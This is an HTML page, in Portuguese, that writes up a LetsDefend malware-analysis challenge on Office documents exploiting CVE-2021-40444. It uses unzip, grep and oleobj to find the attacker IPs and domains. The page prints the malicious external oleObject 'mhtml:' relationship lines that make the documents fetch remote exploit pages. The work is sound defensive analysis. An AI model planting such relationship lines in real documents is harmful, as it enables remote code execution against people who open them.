@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="pt-br" >
+<head>
+    <!--meta tags-->
+    <title>MSHTML Analyzer - LetsDefend | Kauan Manzato</title>
+    <meta charset="UTF-8">
+
+    <!--FIXME: [MSHTML] corrigir meta tags
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="title" content="Kauan Manzato"/>
+    <meta name="description" content="Página pessoal com foco em segurança da informação e ethical hacking. Aqui você encontra writeups, artigos e mais!"/>
+
+    <meta property="og:url" content="https://kauanmn.github.io/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Kauan Manzato">
+    <meta property="og:description" content="Página pessoal com foco em segurança da informação e ethical hacking. Aqui você encontra writeups, artigos e mais!">
+    <meta property="og:image" content="https://kauanmn.github.io/img/landing_page.png">
+    <meta property="og:image:width" content="500">
+    <meta property="og:image:height" content="500">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:creator" content="@manzatosec"/>
+    <meta property="twitter:domain" content="kauanmn.github.io">
+    <meta property="twitter:url" content="https://kauanmn.github.io/">
+    <meta name="twitter:title" content="Kauan Manzato">
+    <meta name="twitter:description" content="Página pessoal com foco em segurança da informação e ethical hacking. Aqui você encontra writeups, artigos e mais!">
+    <meta name="twitter:image" content="https://kauanmn.github.io/img/landing_page.png">
+    -->
+    
+    <!-- BOOTSTRAP -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.min.js" integrity="sha384-0pUGZvbkm6XF6gxjEnlmuGrJXVbNuzT9qBBavbLwCsOGabYfZo0T0to5eqruptLy" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js" integrity="sha384-I7E8VVD/ismYTF4hNIPjVp/Zjvgyol6VFvRkX/vR+Vc4jQkC+hVqc2pM8ODewa9r" crossorigin="anonymous"></script>
+
+    <!-- HIGHLIGHT.JS -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark-dimmed.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+
+    <!-- INTERNO -->
+    <link rel="stylesheet" href="../../style.css">
+    <link rel="icon" href="../../img/favicon.svg" type="image/svg+xml">
+    
+</head>
+<body>
+  <div class="col-lg-8 mx-auto p-4 py-md-5">
+    <header class="my-4">
+      <div class="row align-items-center">
+        <div class="col-3 text-center">
+          <a href="../letsdefend.html">
+            <button class="btn btn-link rounded-circle p-2 lh-1 me-2" type="button">
+              <svg class="bi" width="24" height="24">
+                <image xlink:href="../../img/chevron-left.svg" width="24" height="24">
+              </svg>
+              <span class="visually-hidden">Voltar</span>
+            </button>
+          </a>
+        </div>
+        <div class="col-6 text-center">
+          <h1 class="display-4 fw-bold text-body-emphasis text-center d-inline roxo">MSHTML Analyzer</h1>
+        </div>
+      </div>
+    <main class="bd-content">
+      <div class="container-lg mt-4">
+        <h3>Problema</h3>
+        <pre>2021's 0-Day MSHTML
+
+Challenge Files (pass: infected): <a href="https://files-ld.s3.us-east-2.amazonaws.com/mshtml.zip">Download</a>
+
+This challenge prepared by @Bohan Zhang Malware samples: <a href="https://bazaar.abuse.ch/">MalwareBazaar</a></pre>
+        <hr>
+        <h3>Solução</h3>
+        <p>As ferramentas usadas para a resolução deste problema foram: (1) Kali Linux 2023 (VM), (2) scripts <code>oletools</code> e (3) VirusTotal.</p>
+        <br>
+        <p><strong>1. Examing the <code>Employees_Contact_Audit_Oct_2021.docx</code> file, what is the malicious IP in the docx file?</strong></p>
+        <p>Para descobrir o IP, eu recorri à análise estática do arquivo <code>Employees_Contact_Audit_Oct_2021.docx</code>.</p>
+        
+        <p>Arquivos com a extensão <code>.docx</code> são arquivos zip baseados em XML, formato desenvolvido pela Microsoft em 2007 (<a href="https://en.wikipedia.org/wiki/Office_Open_XML">Office Open XML</a>). Por este motivo, resolvi utilizar a ferramenta <code>unzip</code> para extrair os conteúdos do malware e colocar tudo dentro de uma pasta chamada <code>ooxml_output</code>. Abaixo, você consegue visualizar todo o conteúdo que estava dentro do <code>.docx</code>.</p>
+
+<pre><code class="language-shell">$ unzip -qq Employees_Contact_Audit_Oct_2021.docx -d ooxml_output | tree             
+  .
+  ├── Employees_Contact_Audit_Oct_2021.docx
+  ├── Employee_W2_Form.docx
+  ├── income_tax_and_benefit_return_2021.docx
+  ├── ooxml_output
+  │   ├── [Content_Types].xml
+  │   ├── docProps
+  │   │   ├── app.xml
+  │   │   └── core.xml
+  │   ├── _rels
+  │   └── word
+  │       ├── document.xml
+  │       └── _rels
+  │           └── document.xml.rels
+  └── Work_From_Home_Survey.doc
+  
+  6 directories, 9 files</code></pre>
+
+  <p>O enunciado do problema pede para fornecermos o IP malicioso que o malware traz consigo. Portanto, precisamos achar um endereço IP nos conteúdos do arquivo. Para isto, eu usei o poder do <code>grep</code> com expressões regulares (regex):</p>
+
+<pre><code class="language-shell">$ grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' -r ./ooxml_output</code></pre>
+
+        <p>O código acima, em termos simples, procura endereços IP, representados pela expressão regular (<code>[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}</code>), dentro da pasta <code>ooxml_output</code> que contém os conteúdos do arquivo.</p>
+
+<pre><code class="language-shell" style="white-space: pre-wrap;">$ grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' -r ./ooxml_output
+./ooxml_output/word/_rels/document.xml.rels:
+&lt;Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"&gt;
+&lt;Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings" Target="webSettings.xml"/&gt;
+&lt;Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/&gt;
+&lt;Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/&gt;
+&lt;Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/&gt;&lt;Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable" Target="fontTable.xml"/&gt;
+&lt;Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="mhtml:http://175.24.190.249/note.html!x-usc:http://175.24.190.249/note.html" TargetMode="External"/&gt;
+&lt;Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image1.wmf"/&gt;
+&lt;/Relationships></code></pre>
+
+        <p>O <code>grep</code> encontra o IP <code>175.24.190.249</code> dentro do arquivo <code>document.xml.rels</code>. Agora, resolvi utilizar o <code>VirusTotal</code> para verificar se o endereço IP encontrado é malicioso:</p>
+
+        <img src="./img/mshtml_1.png" alt="Relatório do VirusTotal mostra que o endereço IP é malicioso." class="img-fluid pb-3">
+
+        <br>
+
+        <p>Conforme o resultado da análise do VirusTotal, o endereço IP é malicioso e é a nossa resposta: <code>175.24.190.249</code>.</p>
+
+        <hr><br>
+
+        <!-- EXERCÍCIO 2-->
+        <p><strong>2. Examing the <code>Employee_W2_Form.docx</code> file, what is the malicious domain in the docx file?</strong></p>
+
+        <p>Como o arquivo é semelhante, parti para uma análise semelhante à anterior: extraí os conteúdos do <code>.docx</code> usando o <code>unzip</code> e procurei por uma URL usando <code>grep</code> e expressão regular.</p>
+
+        <p>Extraindo o conteúdo do OOXML:</p>
+
+<pre><code>$ unzip -qq Employee_W2_Form.docx -d ooxml_output | tree 
+  .
+  ├── Employees_Contact_Audit_Oct_2021.docx
+  ├── Employee_W2_Form.docx
+  ├── income_tax_and_benefit_return_2021.docx
+  ├── ooxml_output
+  │   ├── [Content_Types].xml
+  │   ├── docProps
+  │   │   ├── app.xml
+  │   │   └── core.xml
+  │   ├── _rels
+  │   └── word
+  │       └── styles.xml
+  └── Work_From_Home_Survey.doc
+  
+  5 directories, 8 files</code></pre>
+
+        <p>Procurando por URLs nos conteúdos:</p>
+
+<pre><code>grep -Eoh "(http|https)://[a-zA-Z0-9./?=_%:-]*" -r ./ooxml_output | sort | uniq</code></pre>
+
+        <p>Simplificando, o código acima procura links (URLs) únicos. Porém, nenhum link malicioso foi encontrado. Portanto, eu continuei a análise por outro caminho: o script <code>oleobj</code> do conjunto de ferramentas Python <code>oletools</code>. O <code>oleobj</code> serve para extrair objetos integrados em arquivos que usam a tecnologia OLE, como o arquivo <code>Employee_W2_Form.docx</code>.</p>
+
+        <p>Primeiro, eu fiz o download das ferramentas com <code>git clone https://github.com/decalage2/oletools.git</code>. Depois, eu executei o script <code>oleobj.py</code> com o malware como parâmetro:</p>
+
+<pre><code style="white-space: pre-wrap;">$ python oleobj.py ../../Employee_W2_Form.docx 
+oleobj 0.60.1 - http://decalage.info/oletools
+THIS IS WORK IN PROGRESS - Check updates regularly!
+Please report any issue at https://github.com/decalage2/oletools/issues
+
+-------------------------------------------------------------------------------
+File: '../../Employee_W2_Form.docx'
+Found relationship 'oleObject' with external link mhtml:arsenal.30cm.tw:1212/word.html!x-usc:arsenal.30cm.tw:1212/word.html
+Potential exploit for CVE-2021-40444</code></pre>
+
+        <p>Conforme pode-se notar com o output do script, foi encontrado um URL externo (<code>arsenal.30cm.tw</code>) e até a potencial vulnerabilidade que está sendo explorada: <code>CVE-2021-40444</code>.</p>
+
+        <p>Pesquisando no VirusTotal, o resultado é que a URL encontrada é maliciosa (pontuação 3/90 no VT). Logo, a resposta é <code>arsenal.30cm.tw</code>.</p>
+
+        <hr><br>
+
+        <p><strong>3. Examing the <code>Work_From_Home_Survey.doc</code> file, what is the malicious domain in the doc file?</strong></p>
+
+        <p>Como o <code>oleobj</code> foi excelente em descobrir o domínio malicioso do arquivo <code>Employee_W2_Form.docx</code>, irei utilizá-lo para encontrar o domínio malicioso neste outro arquivo também:</p>
+
+<pre><code style="white-space: pre-wrap;">$ python oleobj.py ../../Work_From_Home_Survey.doc  
+oleobj 0.60.1 - http://decalage.info/oletools
+THIS IS WORK IN PROGRESS - Check updates regularly!
+Please report any issue at https://github.com/decalage2/oletools/issues
+
+-------------------------------------------------------------------------------
+File: '../../Work_From_Home_Survey.doc'
+Found relationship 'oleObject' with external link mhtml:http://trendparlye.com/wiki0509.html!x-usc:http://trendparlye.com/wiki0509.html
+Potential exploit for CVE-2021-40444</code></pre>
+
+        <p>O domínio <code>http://trendparlye.com/</code> que saiu como resultado também é considerado malicioso pelo VirusTotal (pontuação 10 de 92). Portanto, nossa resposta é <code>http://trendparlye.com/</code>.</p>
+
+        <hr><br>
+
+        <!-- EXERCÍCIO 4 -->
+        <p><strong>4. Examing the <code>income_tax_and_benefit_return_2021.docx</code>, what is the malicious domain in the docx file?</strong></p>
+
+        <p>Como este exercício é idêntico aos últimos dois, farei da mesma forma: com o <code>oleobj.py</code>.</p>
+
+<pre><code style="white-space: pre-wrap">$ python oleobj.py ../../income_tax_and_benefit_return_2021.docx
+oleobj 0.60.1 - http://decalage.info/oletools
+THIS IS WORK IN PROGRESS - Check updates regularly!
+Please report any issue at https://github.com/decalage2/oletools/issues
+
+-------------------------------------------------------------------------------
+File: '../../income_tax_and_benefit_return_2021.docx'
+Found relationship 'oleObject' with external link mhtml:http://hidusi.com/e8c76295a5f9acb7/side.html!x-usc:http://hidusi.com/e8c76295a5f9acb7/side.html
+Potential exploit for CVE-2021-40444</code></pre>
+
+        <p>Verificando o domínio <code>hidusi.com</code> no VirusTotal, descobrimos que ele também é malicioso (pontuação 12 de 93). Portanto, nossa resposta é <code>hidusi.com</code>.</p>
+
+        <hr><br>
+
+        <!-- EXERCÍCIO 5 -->
+        <p><strong>5. What is the vulnerability the above files exploited?</strong></p>
+
+        <p>Nos três exercícios, descobrimos algo em comum com as amostras de arquivos maliciosos: todos exploram a vulnerabilidade <code>CVE-2021-40444</code>. Isto fica mais evidente quando olhamos para um relatório do VirusTotal de uma das amostras (<a href="https://www.virustotal.com/gui/file/ed2b9e22aef3e545814519151528b2d11a5e73d1b2119c067e672b653ab6855a/detection">relatório do VT</a>) em que a CVE está presente. Então, concluímos que a resposta é <code>CVE-2021-40444</code>.</p>
+      </div>
+    </main>
+  </div>
+</body>
+</html>
